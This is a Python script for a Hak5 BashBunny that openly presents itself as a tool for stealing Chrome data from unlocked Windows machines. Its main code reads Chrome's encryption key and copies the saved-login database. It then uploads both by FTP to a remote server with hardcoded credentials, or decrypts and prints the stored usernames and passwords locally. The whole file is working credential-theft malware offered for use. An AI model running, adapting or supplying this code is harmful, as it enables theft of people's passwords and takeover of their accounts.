#   ______   ______  _   _ _______  __          _     _  _       _     _____      
#  / ___\ \ / / __ )| | | | ____\ \/ /         | |__ | || |   __| |___|___ /  ___ 
# | |    \ V /|  _ \| |_| |  _|  \  /   _____  | '_ \| || |_ / _` / __| |_ \ / __|
# | |___  | | | |_) |  _  | |___ /  \  |_____| | |_) |__   _| (_| \__ \___) | (__ 
#  \____| |_| |____/|_| |_|_____/_/\_\         |_.__/   |_|  \__,_|___/____/ \___|
#
#                      /|      __
#*             +      / |   ,-~ /             +
#     .              Y :|  //  /                .         *
#         .          | jj /( .^     *
#               *    >-"~"-v"              .        *        .
#*                  /       Y
#   .     .        jo  O    |     .            +
#                 ( ~T~     j                     +     .
#      +           >._-' _./         +
#               /| ;-"~ _  l
#  .           / l/ ,-"~    \     +
#              \//\/      .- \
#       +       Y        /    Y         0xb4dbyt3
#               l       I     !
#               ]\      _\    /"\
#              (" ~----( ~   Y.  )
#          ~~~~~~~~~~~~~~~~~~~~~~~~~~
#            
#
# Name      :   chr0m3x_b4d                                                                 
# Author    :   0xb4dbyt3
# Contact   :   b4dbyt3@protonmail.com
# GitHub    :   0xb4dbyt3
# Desc      :   Client script invoked by Hak5 BashBunny for Chrome Data Exfiltration on Windows unlocked machines.
#               This script will send the chrome db and the userprofile key to a server machine with all the .NET utility installed.
#               Check the server side script at: http://github.com/0xb4dbyt3/<ADD NEW URL>
#
# Params    :   
#   WORK_ONLINE    -> Set this variable at False to save db and key on the Bash Bunny. Set it to True to exfiltrate through SCP
#   HOST            -> This should be the IP of the machine where the server side script is running

import os
import json
import base64
import sqlite3
import win32crypt
import ftplib
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta

WORK_ONLINE = True
HOST = "10.2.0.2"
PORT = 60000
FTP_USERNAME = "user"
FTP_PASSWORD  = "bCtYbGLVNsRpayqiyjaI"

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    print(f'Key Type: {type(local_state["os_crypt"]["encrypted_key"])}')

    key_str = local_state["os_crypt"]["encrypted_key"]
    print(f"key_user on client: {key_str}")
    # decode the encryption key from Base64
    key = base64.b64decode(key_str)
    
    print(f"Key Type: {type(key)}")
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html

    if WORK_ONLINE == True:
        print(f"Attempting to estabilish connection to {HOST}:{PORT}")
        #session = ftplib.FTP(HOST, FTP_USERNAME, FTP_PASSWORD)
        session = ftplib.FTP()
        session.connect(HOST, PORT)
        session.login(FTP_USERNAME, FTP_PASSWORD)
        with open('user_key.txt', 'w') as file: 
            file.write(key_str)
        
        session.storbinary('STOR user_key.txt', open('user_key.txt', 'rb'))
        file.close()                                    # close file and FTP
        session.quit()
        print(f"user_key.txt successfully copied to {HOST}:{PORT}")
    else:
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)

    if WORK_ONLINE == True:
        print(f"Attempting to estabilish connection to {HOST}:{PORT}")
        session = ftplib.FTP()
        session.connect(HOST, PORT)
        session.login(FTP_USERNAME, FTP_PASSWORD)
        session.storbinary(f"STOR ChromeData.db", open("ChromeData.db", "rb"))
                                         # close file and FTP
        session.quit()
        print(f"ChromeData.db successfully copied to {HOST}:{PORT}")
    else:
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                print(f"Key: {key}")
                print(f"Origin URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                print(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
            print("="*50)

        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            os.remove(filename)
        except:
            pass


if __name__ == "__main__":
    main()